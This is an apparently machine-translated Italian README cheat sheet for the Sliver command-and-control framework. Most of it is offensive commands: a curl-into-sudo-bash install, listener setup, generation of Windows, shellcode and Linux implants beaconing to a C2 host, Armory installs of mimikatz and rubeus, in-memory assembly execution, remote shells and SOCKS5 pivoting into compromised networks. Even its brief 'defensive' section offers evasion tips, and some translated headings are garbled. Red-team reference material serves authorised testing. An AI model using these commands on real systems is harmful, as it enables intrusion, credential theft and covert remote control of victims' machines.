<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Sliver C2 - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<palign="centro">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Vai">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Red Team">
</p>

<palign="centro">
  <b>⚔️ Emulazione avversaria moderna, multipiattaforma e open source e framework di comando e controllo che supporta i protocolli mTLS, WireGuard, HTTP(S) e DNS</b>
</p>

---

## 📋 Sommario

- [Panoramica e architettura](#-panoramica--architettura)
- [Installazione e configurazione del server](#-installazione--configurazione del server)
  - [Installazione One-Liner automatizzata](#installazione-one-liner-automatica)
  - [Configurazione operatore multigiocatore](#configurazione-operatore-multigiocatore)
- [Configurazione del listener (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Generazione di impianti (Beacon vs Sessioni)](#-generazione-impianti-beacon-vs-sessioni)
  - [Sessioni interattive e beacon asincroni](#sessioni-interattive-e-beacon-asincroni)
  - [Windows EXE e impianti Shellcode](#windows-exe--shellcode-implants)
  - [Impianti ELF Linux e macOS](#linux--macos-elf-implants)
- [Ecosistema post-sfruttamento e armeria](#-post-sfruttamento--ecosistema-armeria)
  - [Installazione delle estensioni dell'Armeria (BOF, Donut, Cintura di sicurezza)](#installazione-armeria-estensioni-bofs-donut-cintura di sicurezza)
  - [Accesso credenziali e Mimikatz](#accesso-credenziali--mimikatz)
  - [Calze pivottanti e dinamiche5](#pivoting--dynamic-socks5)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e rilevamento](#-considerazioni-difensive--rilevamento)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e architettura

Progettato in Go da **Bishop Fox**, **Sliver** è una delle principali alternative open source ai framework C2 commerciali (Cobalt Strike, Brute Ratel):
- **Multipiattaforma:** Server e impianti supportano Windows, Linux e macOS su `x86_64`, `arm64` e `arm`.
- **Comunicazione evasiva:** supporto immediato per mutuo TLS (mTLS), tunnel UDP WireGuard, HTTP/HTTPS con generazione canary procedurale e tunneling DNS.
- **Esecuzione in memoria:** Iniezione DLL riflettente nativa, BOF (Beacon Object Files), esecuzione .NET in linea tramite Donut e svuotamento dei processi.
- **Architettura multigiocatore:** Collaborazione in tempo reale tra più operatori della squadra rossa tramite profili operatore firmati crittograficamente.

---

## 📥 Installazione e configurazione del server

### Installazione One-Liner automatizzata
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### Configurazione dell'operatore multigiocatore
Crea un profilo operatore sul server C2 per un membro del team:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 Configurazione dell'ascoltatore (mTLS, HTTP, WireGuard, DNS)

All'interno della console `sliver`:
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 Generazione di impianti (Beacon vs Sessioni)

### Sessioni interattive e beacon asincroni
- **Sessione:** Connessione TCP/TLS in tempo reale con risposta istantanea ai comandi. Maggiore visibilità della rete.
- **Beacon:** Battito cardiaco asincrono che dorme per intervalli con jitter casuale. Drammaticamente più difficile da identificare per i SOC tramite l'analisi delle anomalie di rete.

### Impianti Windows EXE e Shellcode
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Impianti ELF Linux e macOS
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ Ecosistema post-sfruttamento e armeria

### Installazione delle estensioni dell'Armeria (BOF, Donut, Seatbelt)
The Armory è il gestore di pacchetti integrato di Sliver per strumenti offensivi di terze parti e Cobalt Strike Beacon Object Files (BOF):
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### Interazione con sessioni e beacon
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### CALZINI girevoli e dinamici5
Indirizza gli strumenti offensivi esterni direttamente nella rete di destinazione compromessa:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Avvia ascoltatore mTLS** | `mtls --lport 8888` |
| **Avvia ascoltatore HTTPS** | `https --lport 443 --domain c2.domain.com` |
| **Genera sessione EXE** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Genera Beacon EXE** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Genera Shellcode non elaborato** | `generate --mtls <IP>:8888 -f shellcode` |
| **Elenca e interagisci con le sessioni**| `sessions` -> `use <ID>` |
| **Installa gli strumenti dell'Armeria** | `armory install seatbelt mimikatz` |
| **Esecuzione .NET in memoria**| `execute-assembly /path/to/binary.exe <args>` |
| **SOCKS5 Proxy inverso** | `socks5 start --port 1080` |

---

## 🛡️ Considerazioni difensive e rilevamento

1. **JARM Fingerprinting:** i listener HTTP Sliver predefiniti possono essere profilati utilizzando il fingerprinting JARM TLS attivo. Personalizza le crittografie TLS nella configurazione Sliver.
2. **YARA e analisi binaria:** gli impianti predefiniti prodotti da `generate` contengono metadati Golang e strutture di simboli a meno che non siano offuscati tramite confusione (`--skip-symbols`).

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Sliver è una simulazione avanzata dell'avversario e un framework di comando e controllo della squadra rossa. Deve essere utilizzato esclusivamente in impegni autorizzati con regole di ingaggio chiare (RoE). L'uso non autorizzato su computer di terze parti è strettamente illegale.